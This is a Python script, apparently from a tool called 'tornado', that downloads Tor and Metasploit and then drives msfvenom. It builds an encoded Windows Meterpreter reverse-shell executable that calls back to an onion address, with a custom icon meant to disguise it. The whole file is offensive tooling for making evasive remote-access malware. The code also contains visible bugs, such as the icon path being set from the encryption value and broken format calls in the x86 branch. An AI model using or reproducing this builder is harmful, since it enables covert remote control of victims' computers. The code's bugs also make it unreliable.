import os
import wget
import time
import shutil
import zipfile
import tornado
import pathlib
import argparse
import subprocess
from colorama import Fore, Back, Style, init
init(autoreset=False)
bblue = Fore.BLUE + Style.BRIGHT
bos = "\033[1;37m"

def download_tor():
    tor_url = 'https://www.torproject.org/dist/torbrowser/11.0.4/tor-win32-0.4.6.9.zip'
    wget.download(tor_url, out='C:')
    print(f"\n{bblue}[+]{bos} Tor is downloaded in C:\\ directory.")
    with zipfile.ZipFile('C:\\tor-win32-0.4.6.9.zip', 'r') as tor:
        os.path.join("C:")
        tor.extractall('C:\\')
        print(f'{bblue}[+]{bos} File is unzipped in C: disk.')
    pathlib.Path('C:\\tor-win32-0.4.6.9.zip').unlink()
    shutil.rmtree('C:\\Data')
    print(f"{bblue}[+]{bos} Zip file is gone.")

def download_metasploit():
    metasploit_url = 'https://windows.metasploit.com/metasploitframework-latest.msi'
    wget.download(metasploit_url, out='C:\\Tor\\')
    subprocess.run(['msiexec', '/i', 'metasploitframework-latest.msi'])
    print(f"\n{bblue}[+]{bos} Metasploit is downloaded.")

def shell(host):
    print(f"{bblue}[+]{bos} What payload do you need: [tcp-https-http-ipv6_tcp]:")
    payload = input()
    payload = payload or "tcp"

    print(f"{bblue}[+]{bos} Enter arch: [x86--x64] [default: x64]")
    arch = input()
    arch = arch or "x64"

    lhost = host
    lport = 80

    print(f"{bblue}[+]{bos} Iterations: [default: 2]")
    iterations = input()
    iterations = iterations or "2"
    
    print(f"{bblue}[+]{bos} Encryption: [default: x86/shikata_ga_nai]:")
    encryption = input()
    encryption = encryption or "x86/shikata_ga_nai"

    print(f"{bblue}[+]{bos} Icon Path: [default: icons/tornado.ico]:")
    icon_name = input()
    icon_name = encryption or "icons/tornado.ico"
    
    print(f"{bblue}[*]{bos} Payload: {payload}")
    print(f"{bblue}[*]{bos} Arch: {arch}")
    print(f"{bblue}[*]{bos} Onion Adress: {lhost}:{lport}")
    print(f"{bblue}[*]{bos} Iterations: {iterations}")
    print(f"{bblue}[*]{bos} Encryption: {encryption}")
    print(f"{bblue}[*]{bos} Icon for Payload: {icon_name}")
    print(f"{bblue}[+]{bos} Shell saved in local directory.")
    
    if arch == "x64":
        subprocess.run(
            [
                "msfvenom",
                "-p",
                f"windows/x64/meterpreter_reverse_{payload}",
                f"LHOST={lhost}",
                f"LPORT={lport}",
                f"-i {iterations}",
                f"-e {encryption}",
                "--platform windows",
                "-a x64",
                "-f exe",
                "-o tornado.exe"
            ]
        )

    if arch == "x86":
        subprocess.run(
            [
                "msfvenom",
                "-p",
                "windows/meterpreter_reverse_{payload}".format(payload),
                "LHOST={lhost}".format(lhost),
                "LPORT={lport}".format(lport),
                "-i {iterations}".format(iterations),
                "-e {encryption}".format(encryption),
                "--platform windows",
                "-a x86",
                "-f exe",
                "-o tornado.exe"
            ]
        )

